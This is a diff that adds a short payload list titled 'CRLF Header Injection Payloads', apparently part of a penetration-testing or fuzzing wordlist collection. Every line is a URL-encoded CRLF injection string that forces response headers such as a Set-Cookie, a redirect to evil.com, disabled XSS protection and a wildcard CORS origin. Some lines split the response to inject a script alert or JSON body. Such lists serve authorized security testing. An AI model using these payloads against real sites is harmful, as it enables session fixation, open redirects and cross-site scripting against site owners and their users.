@@ -1,0 +1,12 @@
+# CRLF Header Injection Payloads
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Injected:header
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Type:text/html
+%0d%0aContent-Length:0
+%0d%0aX-XSS-Protection:0
+%0d%0aAccess-Control-Allow-Origin:*
+%0d%0aX-Frame-Options:ALLOW
+%0d%0aCache-Control:no-cache
+%0d%0a%0d%0a<html><script>alert(1)</script></html>
+%0d%0a%0d%0a{"injected":"json"}
